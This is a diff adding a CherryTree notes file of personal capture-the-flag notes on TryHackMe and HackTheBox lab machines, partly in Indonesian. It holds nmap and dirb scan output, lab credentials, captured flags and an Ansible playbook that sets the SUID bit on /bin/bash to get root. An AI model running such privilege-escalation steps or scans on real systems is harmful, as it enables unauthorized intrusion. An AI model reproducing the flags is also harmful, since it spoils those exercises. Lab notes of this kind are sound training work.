@@ -1,0 +1,271 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="CTF" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1681438558" ts_lastsave="1682263602">
+    <node name="TryHackMe" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1681438567" ts_lastsave="1681468137">
+      <node name="SimpleCTF" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1681438572" ts_lastsave="1681438585">
+        <rich_text>           </rich_text>
+        <rich_text scale="h1" weight="heavy">port open </rich_text>
+        <rich_text>
+ nmap -sV -A 10.10.247.133 -Pn 
+Starting Nmap 7.93 ( </rich_text>
+        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+        <rich_text> ) at 2023-04-14 09:10 WIB
+Nmap scan report for 10.10.247.133
+Host is up (0.67s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-robots.txt: 2 disallowed entries 
+|_/ /openemr-5_0_1_3 
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 294269149ecad917988c27723acda923 (RSA)
+|_  256 9bd165075108006198de95ed3ae3811c (ECDSA)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at </rich_text>
+        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
+        <rich_text> .
+Nmap done: 1 IP address (1 host up) scanned in 221.26 seconds
+
+
+
+</rich_text>
+      </node>
+      <node name="Mr Robot" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1681459441" ts_lastsave="1681466869">
+        <rich_text>user: Elliot
+pass: </rich_text>
+        <rich_text style="italic" weight="heavy">ER28-0652</rich_text>
+        <rich_text>
+
+flag 1 : 073403c8a58a1f80d943455fb30724b9
+flag 2: 822c73956184f694993bede3eb39f959
+flag 3: 04787ddef27c3dee1ee161b21670b4e4</rich_text>
+      </node>
+      <node name="root me" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1681468137" ts_lastsave="1681472337">
+        <rich_text> nmap -sV -A -T2 10.10.195.232 -Pn
+Starting Nmap 7.93 ( </rich_text>
+        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+        <rich_text> ) at 2023-04-14 17:13 WIB
+Stats: 0:11:00 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 86.64% done; ETC: 17:26 (0:01:42 remaining)
+Stats: 0:13:51 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 91.52% done; ETC: 17:27 (0:00:00 remaining)
+Nmap scan report for 10.10.195.232
+Host is up (0.53s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4ab9160884c25448ba5cfd3f225f2214 (RSA)
+|   256 a9a686e8ec96c3f003cd16d54973d082 (ECDSA)
+|_  256 22f6b5a654d9787c26035a95f3f9dfcd (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: HackIT - Home
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at </rich_text>
+        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
+        <rich_text> .
+Nmap done: 1 IP address (1 host up) scanned in 862.08 seconds
+
+
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Apr 14 17:14:21 2023
+URL_BASE: </rich_text>
+        <rich_text link="webs http://10.10.195.232/">http://10.10.195.232/</rich_text>
+        <rich_text>
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+OPTION: Not Stopping on warning messages
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: </rich_text>
+        <rich_text link="webs http://10.10.195.232/">http://10.10.195.232/</rich_text>
+        <rich_text> ----
+==&gt; DIRECTORY: </rich_text>
+        <rich_text link="webs http://10.10.195.232/css/">http://10.10.195.232/css/</rich_text>
+        <rich_text>                                                                                                                              
++ </rich_text>
+        <rich_text link="webs http://10.10.195.232/index.php">http://10.10.195.232/index.php</rich_text>
+        <rich_text> (CODE:200|SIZE:616)                                                                                                                  
+==&gt; DIRECTORY: </rich_text>
+        <rich_text link="webs http://10.10.195.232/js/">http://10.10.195.232/js/</rich_text>
+        <rich_text>                                                                                                                               
+==&gt; DIRECTORY: </rich_text>
+        <rich_text link="webs http://10.10.195.232/panel/">http://10.10.195.232/panel/</rich_text>
+        <rich_text>                                                                                                                            
++ </rich_text>
+        <rich_text link="webs http://10.10.195.232/server-status">http://10.10.195.232/server-status</rich_text>
+        <rich_text> (CODE:403|SIZE:278)                                                                                                              
+ Testing: </rich_text>
+        <rich_text link="webs http://10.10.195.232/tartarus">http://10.10.195.232/tartarus</rich_text>
+        <rich_text>                                                                                                                            
+                                              
+                                              flag : THM{y0u_g0t_a_sh3ll}
+                                              THM{pr1v1l3g3_3sc4l4t10n}</rich_text>
+      </node>
+    </node>
+    <node name="HackTheBox" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1682263602" ts_lastsave="1682358413">
+      <node name="Inject" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1682263613" ts_lastsave="1682264250">
+        <rich_text>vuln in dir travel di upload gambar
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;settings xmlns="</rich_text>
+        <rich_text link="webs http://maven.apache.org/POM/4.0.0">http://maven.apache.org/POM/4.0.0</rich_text>
+        <rich_text>" xmlns:xsi="</rich_text>
+        <rich_text link="webs http://www.w3.org/2001/XMLSchema-instance">http://www.w3.org/2001/XMLSchema-instance</rich_text>
+        <rich_text>"
+        xsi:schemaLocation="</rich_text>
+        <rich_text link="webs http://maven.apache.org/POM/4.0.0">http://maven.apache.org/POM/4.0.0</rich_text>
+        <rich_text> </rich_text>
+        <rich_text link="webs https://maven.apache.org/xsd/maven-4.0.0.xsd">https://maven.apache.org/xsd/maven-4.0.0.xsd</rich_text>
+        <rich_text>"&gt;
+  &lt;servers&gt;
+    &lt;server&gt;
+      &lt;id&gt;Inject&lt;/id&gt;
+      &lt;username&gt;phil&lt;/username&gt;
+      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;
+      &lt;privateKey&gt;${user.home}/.ssh/id_dsa&lt;/privateKey&gt;
+      &lt;filePermissions&gt;660&lt;/filePermissions&gt;
+      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;
+      &lt;configuration&gt;&lt;/configuration&gt;
+    &lt;/server&gt;
+  &lt;/servers&gt;
+&lt;/settings&gt;
+
+
+teknologi yang di gunakan springframework
+
+exploit </rich_text>
+        <rich_text link="webs https://www.rapid7.com/blog/post/2022/04/01/metasploit-weekly-wrap-up-155/">https://www.rapid7.com/blog/post/2022/04/01/metasploit-weekly-wrap-up-155/</rich_text>
+        <rich_text>
+
+
+cat user.txt
+383eceb72610a600542fd6eb7b5f6387
+
+
+- hosts: localhost
+  tasks:
+  - name: Get Root
+    command: chmod u+s /bin/bash
+    become: true
+      </rich_text>
+      </node>
+      <node name="Soccer" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1682358413" ts_lastsave="1682358417">
+        <rich_text>por scanning 
+
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
+|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
+|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
+80/tcp   open  http            nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to </rich_text>
+        <rich_text link="webs http://soccer.htb/">http://soccer.htb/</rich_text>
+        <rich_text>
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+9091/tcp open  xmltec-xmlmail?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|   GetRequest: 
+|     HTTP/1.1 404 Not Found
+|     Content-Security-Policy: default-src 'none'
+|     X-Content-Type-Options: nosniff
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 139
+|     Date: Mon, 24 Apr 2023 17:35:33 GMT
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang="en"&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="utf-8"&gt;
+|     &lt;title&gt;Error&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;pre&gt;Cannot GET /&lt;/pre&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   HTTPOptions, RTSPRequest: 
+|     HTTP/1.1 404 Not Found
+|     Content-Security-Policy: default-src 'none'
+|     X-Content-Type-Options: nosniff
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 143
+|     Date: Mon, 24 Apr 2023 17:35:34 GMT
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang="en"&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="utf-8"&gt;
+|     &lt;title&gt;Error&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at </rich_text>
+        <rich_text link="webs https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</rich_text>
+        <rich_text> :
+SF-Port9091-TCP:V=7.93%I=7%D=4/25%Time=6446BDE4%P=x86_64-pc-linux-gnu%r(in
+SF:formix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
+SF:\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
+SF:20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\
+SF:nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Op
+SF:tions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCo
+SF:ntent-Length:\x20139\r\nDate:\x20Mon,\x2024\x20Apr\x202023\x2017:35:33\
+SF:x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang
+SF:=\"en\"&gt;\n&lt;head&gt;\n&lt;meta\x20charset=\"utf-8\"&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/
+SF:head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20GET\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n")%r(HT
+SF:TPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Pol
+SF:icy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\n
+SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\
+SF:r\nDate:\x20Mon,\x2024\x20Apr\x202023\x2017:35:34\x20GMT\r\nConnection:
+SF:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\"en\"&gt;\n&lt;head&gt;\n&lt;me
+SF:ta\x20charset=\"utf-8\"&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;C
+SF:annot\x20OPTIONS\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n")%r(RTSPRequest,16C,"HT
+SF:TP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-s
+SF:rc\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20
+SF:text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Mon,\
+SF:x2024\x20Apr\x202023\x2017:35:34\x20GMT\r\nConnection:\x20close\r\n\r\n
+SF:&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\"en\"&gt;\n&lt;head&gt;\n&lt;meta\x20charset=\"u
+SF:tf-8\"&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20OPTIONS\
+SF:x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad
+SF:\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F
+SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%
+SF:r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnect
+SF:ion:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r
+SF:\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x
+SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at </rich_text>
+        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
+        <rich_text> .
+Nmap done: 1 IP address (1 host up) scanned in 78.22 seconds
+                     
+                     
+                     
+                     TERDAPAT DIR /tiny
+                     </rich_text>
+      </node>
+    </node>
+  </node>
+</cherrytree>
